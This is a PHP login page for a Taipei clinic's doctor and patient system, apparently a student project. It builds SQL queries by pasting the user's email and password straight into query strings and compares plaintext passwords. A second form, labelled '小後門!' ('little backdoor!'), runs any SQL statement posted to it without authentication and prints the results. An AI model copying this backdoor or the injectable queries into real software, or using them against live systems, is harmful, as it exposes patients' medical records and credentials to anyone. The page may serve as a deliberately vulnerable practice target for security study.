<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/animations.css">  
    <link rel="stylesheet" href="css/main.css">  
    <link rel="stylesheet" href="css/login.css">
        
    <title>台北綜合診所</title>

    
    
</head>
<body>
    <?php

    //learn from w3schools.com
    //Unset all the server side variables

    session_start();

    $_SESSION["user"]="";
    $_SESSION["usertype"]="";
    
    // Set the new timezone
    date_default_timezone_set('Asia/Kolkata');
    $date = date('Y-m-d');

    $_SESSION["date"]=$date;
    

    //import database
    include("connection.php");

    



    if($_POST){
        if(array_key_exists('useremail', $_POST)){
        $email=$_POST['useremail'];
        $password=$_POST['userpassword'];
        
        $error='<label for="promter" class="form-label"></label>';

        $result_doctor = $database->query("select * from doctor where docemail='$email'");
        $result_patient = $database->query("select * from patient where pemail='$email'");
        
        if($result_doctor->num_rows==1){
            //TODO
            $checker = $database->query("select * from doctor where docemail='$email' and docpassword='$password'");
            if ($checker->num_rows==1){


                //   doctor dashbord
                $_SESSION['user']=$email;
                $_SESSION['usertype']='d';
                header('location: doctor/index.php');

            }else{
                $error='<label for="promter" class="form-label" style="color:rgb(255, 62, 62);text-align:center;">Wrong credentials: Invalid email or password</label>';
            }
        }else if($result_patient->num_rows==1){
            //TODO
            $checker = $database->query("select * from patient where pemail='$email' and ppassword='$password'");
            if ($checker->num_rows==1){


                //   Patient dashbord
                $_SESSION['user']=$email;
                $_SESSION['usertype']='p';
                
                header('location: patient/index.php');

            }else{
                $error='<label for="promter" class="form-label" style="color:rgb(255, 62, 62);text-align:center;">Wrong credentials: Invalid email or password</label>';
            }
        }else{
            $error='<label for="promter" class="form-label" style="color:rgb(255, 62, 62);text-align:center;">We cant found any acount for this email.</label>';
        }
    }else{
        $error='<label for="promter" class="form-label"></label>';
        $sql=$_POST['sql'];
        $result_sql = $database->query($sql);
        // $row=$result_sql->fetch_assoc();

        while ($row = $result_sql->fetch_assoc()) {
            print_r($row);
        }
        
        // echo $row;
        // echo '<tr >
                                       
                                        
                                       
                                        
                                        
        //                                 <td style="text-align:center;">
        //                                     '.$result_sql.'
        //                                 </td>

                                        
        //                             </tr>';
    } 
    }else{
        $error='<label for="promter" class="form-label">&nbsp;</label>';
    }

    ?>





    <center>
    <div class="container">
        <table border="0" style="margin: 0;padding: 0;width: 60%;">
            <tr>
                <td>
                    <p class="header-text">歡迎回來!</p>
                </td>
            </tr>
        <div class="form-body">
            <tr>
                <td>
                    <p class="sub-text">登入以繼續</p>
                </td>
            </tr>
            <tr>
                <form action="" method="POST" >
                <td class="label-td">
                    <label for="useremail" class="form-label">信箱: </label>
                </td>
            </tr>
            <tr>
                <td class="label-td">
                    <input type="email" name="useremail" class="input-text" placeholder="信箱" required>
                </td>
            </tr>
            <tr>
                <td class="label-td">
                    <label for="userpassword" class="form-label">密碼: </label>
                </td>
            </tr>

            <tr>
                <td class="label-td">
                    <input type="Password" name="userpassword" class="input-text" placeholder="密碼" required>
                </td>
            </tr>


            <tr>
                <td><br>
                <?php echo $error ?>
                </td>
            </tr>

            <tr>
                <td>
                    <input type="submit" value="登入" class="login-btn btn-primary btn">
                </td>
                <!-- <td>
                    <input type="submit" value="病患登入" class="login-btn btn-primary btn">
                </td> -->
            </tr>
        </div>
            
                        
                        
    
                        
                    </form>
        </table>
        <tr>
                <td>
                    <br>
                    <label for="" class="sub-text" style="font-weight: 280;">還沒有帳號嗎?&#63; </label>
                    <a href="signup.php" class="hover-link1 non-style-link">病患註冊</a>
                    <br><br><br>
                </td>
            </tr>
    </div>
    <div class="container" style="margin-top:120px">
        <table border="0" style="margin: 0;padding: 0; width: 60%;">
            <tr>
                <td>
                    <p class="header-text">小後門!</p>
                </td>
            </tr>
        <div class="form-body">
            <tr>
                <form action="" method="POST" >
                <td class="label-td">
                    <label for="sql" class="form-label">語法: </label>
                </td>
            </tr>
            <tr>
                <td class="label-td">
                    <input type="sql" name="sql" class="input-text" placeholder="sql" required>
                </td>
            </tr>
            <tr>
                <td><br>
                <?php echo $error ?>
                </td>
            </tr>
            <tr>
                <td>
                    <input type="submit" value="輸入" class="login-btn btn-primary btn">
                </td>
            </tr>
        </div>
    </form>
        </table>
    </div>
</center>
</body>
</html>